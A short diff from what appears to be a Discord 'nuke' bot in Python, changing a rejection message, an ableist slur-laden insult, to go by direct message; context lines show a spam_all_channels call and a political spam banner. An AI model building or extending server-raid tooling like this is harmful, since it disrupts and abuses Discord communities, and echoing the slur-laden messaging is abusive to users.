@@ -113,7 +113,7 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
                 await self.spam_all_channels(ctx)
                 print("Done!")
             else:
-                await ctx.send("You fucking retard, you can't nuke this server.")
+                await ctx.author.send("You fucking retard, you can't nuke this server.")
         else:
             await self.warn(ctx, 'nuke')
             raise commands.CommandNotFound('shit')
